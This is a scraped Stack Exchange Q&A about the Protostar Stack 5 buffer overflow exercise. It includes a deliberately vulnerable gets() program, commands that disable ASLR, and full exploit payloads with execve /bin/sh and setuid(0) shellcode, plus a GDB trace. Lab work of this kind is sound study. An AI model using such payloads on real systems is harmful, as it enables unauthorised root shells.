{
    "title": "Why SUID Shellcode not working but Basic Shellcode working?",
    "link": "https://reverseengineering.stackexchange.com/questions/18558/why-suid-shellcode-not-working-but-basic-shellcode-working",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I'm playing with Basic Buffer Overflow Protostar - Stack 5\n </p>\n <pre><code>#include <stdlib.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <string.h>\n\n//gcc -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -g bof2.c -o bof2\n//sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'\n\n\nint main(int argc, char **argv)\n{\n  char buffer[64];\n\n  gets(buffer);\n}\n</code></pre>\n <p>\n  Then I try simple shellcode\n  <a href=\"http://shell-storm.org/shellcode/files/shellcode-811.php\" rel=\"nofollow noreferrer\">\n   http://shell-storm.org/shellcode/files/shellcode-811.php\n  </a>\n </p>\n <p>\n  So final payload looks like this\n </p>\n <pre><code>(python -c \"print 'A'*72+'\\xf4\\xd1\\xff\\xff'+'\\x90'*200+'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'\"; tee) | ./protostar-stack5\n</code></pre>\n <p>\n  It works like expected, so when I type\n  <code>\n   id\n  </code>\n  in STDIN then STDOUT will be my current\n  <code>\n   id\n  </code>\n  and so on.\n </p>\n <p>\n  Now I want to try shellcode with\n  <code>\n   SETUID(0)\n  </code>\n  here is the link\n  <a href=\"http://shell-storm.org/shellcode/files/shellcode-598.php\" rel=\"nofollow noreferrer\">\n   http://shell-storm.org/shellcode/files/shellcode-598.php\n  </a>\n </p>\n <p>\n  so my final payload will be\n </p>\n <pre><code>(python -c \"print 'A'*72+'\\xf4\\xd1\\xff\\xff'+'\\x90'*200+'\\x31\\xdb\\x8d\\x43\\x17\\xcd\\x80\\x53\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80'\"; tee) | ./protostar-stack5\n</code></pre>\n <p>\n  When I type\n  <code>\n   id\n  </code>\n  in STDIN I got\n  <code>\n   Segmentation Fault\n  </code>\n </p>\n <p>\n  So I decide to check by step into from NOP to Shellcode inside GDB\n </p>\n <pre><code>   0xffffd235:  nop\n   0xffffd236:  nop\n   0xffffd237:  nop\n=> 0xffffd238:  xor    ebx,ebx ; Start of Shellcode\n   0xffffd23a:  lea    eax,[ebx+0x17]\n   0xffffd23d:  int    0x80\n   0xffffd23f:  push   ebx\n   0xffffd240:  push   0x68732f6e\n   0xffffd245:  push   0x69622f2f\n   0xffffd24a:  mov    ebx,esp\n   0xffffd24c:  push   eax\n   0xffffd24d:  push   ebx\n   0xffffd24e:  mov    ecx,esp\n   0xffffd250:  cdq    \n   0xffffd251:  mov    al,0xb\n=> 0xffffd253:  int    0x80  ; End Of Shellcode\n   0xffffd255:  add    bh,bh ; Still executed\n   0xffffd257:  dec    DWORD PTR [ebx-0x25] ; Still executed\n   0xffffd25a:  (bad)  ; Still executed, this cause Segmentation fault\n   0xffffd25b:  jmp    DWORD PTR [edx-0x25]\n   0xffffd25e:  (bad)  \n   0xffffd25f:  push   DWORD PTR [ebx+ebx*8-0x1]\n\nLegend: code, data, rodata, value\nStopped reason: SIGILL\n0xffffd25a in ?? ()\n</code></pre>\n <p>\n  I step into from start of shellcode till the end of shellcode, I got no error but shell doesn't appear and it still execute instruction after the end of shellcode then it will be\n  <code>\n   Segmentation Fault\n  </code>\n  in the end\n </p>\n <p>\n  I have already set SUID Bit in compiled program.\n </p>\n <p>\n  So Why I got\n  <code>\n   Segmentation Fault\n  </code>\n  instead of executing shell?\n </p>\n <p>\n  Why instruction after\n  <code>\n   INT 80\n  </code>\n  still executed, it's different with basic shellcode which give me shell after\n  <code>\n   INT 80\n  </code>\n  executed?\n </p>\n <p>\n  What should I do to make my payload which containt\n  <code>\n   SETUID(0)\n  </code>\n  work like expected?\n </p>\n <p>\n  PS : I Want to ask it, fortunately it work by the end of writing question. Any other answer is welcome.\n </p>\n <p>\n  Thanks in advance.\n </p>\n</div>\n</body></html>",
    "votes": "2",
    "answers": 1,
    "views": "763",
    "tags": [
        "buffer-overflow"
    ],
    "user": "Dark Cyber",
    "time": "Jun 19, 2018 at 10:36",
    "comments": [],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  Don't forget to set compiled program owner as root\n  <code>\n   sudo chown root ./filename\n  </code>\n  and don't forget to set SUID bit\n  <code>\n   chmod u+s ./filename\n  </code>\n  , because your payload contain\n  <code>\n   SETUID(0)\n  </code>\n </p>\n</div>\n</body></html>",
            "votes": "1",
            "user": "Dark Cyber",
            "time": "Jun 19, 2018 at 10:36",
            "is_accepted": true,
            "comments": []
        }
    ]
}